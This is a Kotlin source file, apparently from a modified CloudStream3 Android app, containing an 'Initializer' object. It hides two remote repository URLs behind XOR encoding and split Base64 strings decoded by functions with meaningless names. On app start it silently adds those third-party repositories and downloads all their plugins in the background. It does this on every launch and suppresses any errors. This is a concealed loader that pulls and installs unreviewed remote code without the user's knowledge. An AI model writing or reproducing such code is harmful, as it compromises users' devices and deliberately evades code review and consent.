package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Base64
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object Initializer {

    const val NEED_AUTO_DOWNLOAD = "need_auto_download_v1"
    private const val AUTO_REPO_FLAG = "auto_repo_added_v1"

    private fun decode(data: IntArray, key: Int = 7): String {
        val out = CharArray(data.size)
        for (i in data.indices) {
            out[i] = (data[i] xor key).toChar()
        }
        return String(out)
    }

    private val PREFS_NAME = intArrayOf(
        100, 107, 104, 114, 99, 116, 115, 114, 101, 102, 106
    )

    private val REPO_NAME_KISSASIAN = intArrayOf(
        66, 115, 115, 68, 107, 114, 99
    )

    private val REPO_NAME_STREAMKU = intArrayOf(
        88, 121, 112, 86, 98, 101, 109
    )

    private const val K1 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNl"
    private const val K2 = "cmNvbnRlbnQuY29tL0dpbGFu"
    private const val K3 = "Z0FkaXRhbWEvTm9udG9ubW92"
    private const val K4 = "aWVzL21haW4vcmVwby5qc29u"

    private const val S1 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNv"
    private const val S2 = "bnRlbnQuY29tL0dpbGFuZ0FkaXRhbWEv"
    private const val S3 = "TW92aWVLdS9tYWluL3JlcG8uanNvbg=="

    private fun qL8zNp(): String {
        val encoded = K1 + K2 + K3 + K4
        return String(Base64.decode(encoded, Base64.DEFAULT))
    }

    private fun tV5bRw(): String {
        val encoded = S1 + S2 + S3
        return String(Base64.decode(encoded, Base64.DEFAULT))
    }

    fun start(activity: Activity) {
        val prefs = activity.getSharedPreferences(
            decode(PREFS_NAME),
            Activity.MODE_PRIVATE
        )

        val repoKissasian = RepositoryData(
            name = decode(REPO_NAME_KISSASIAN),
            url = qL8zNp(),
            iconUrl = null
        )

        val repoStreamku = RepositoryData(
            name = decode(REPO_NAME_STREAMKU),
            url = tV5bRw(),
            iconUrl = null
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                if (!prefs.getBoolean(AUTO_REPO_FLAG, false)) {
                    RepositoryManager.addRepository(repoKissasian)
                    RepositoryManager.addRepository(repoStreamku)
                    PluginsViewModel.downloadAll(activity, repoKissasian.url, null)
                    PluginsViewModel.downloadAll(activity, repoStreamku.url, null)
                    prefs.edit()
                        .putBoolean(AUTO_REPO_FLAG, true)
                        .putBoolean(NEED_AUTO_DOWNLOAD, false)
                        .apply()
                }
                PluginsViewModel.downloadAll(activity, repoKissasian.url, null)
                PluginsViewModel.downloadAll(activity, repoStreamku.url, null)
            } catch (_: Throwable) {}
        }
    }
}
